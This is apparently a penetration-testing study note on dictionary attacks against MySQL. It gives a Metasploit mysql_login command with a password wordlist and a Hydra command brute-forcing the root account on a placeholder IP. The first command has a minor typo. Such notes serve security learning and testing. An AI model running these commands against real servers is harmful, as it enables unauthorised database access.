---
up: "[[SQL]]"
tools:
  - "[[Hydra]]"
---

# MySQL - Dictionary attack

```bash
msf5> use/auxiliary/scanner/mysql/mysql_login
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

With [[Hydra]]:

```bash
hydra -l root -P unix_passwords.txt <ip> mysql
```
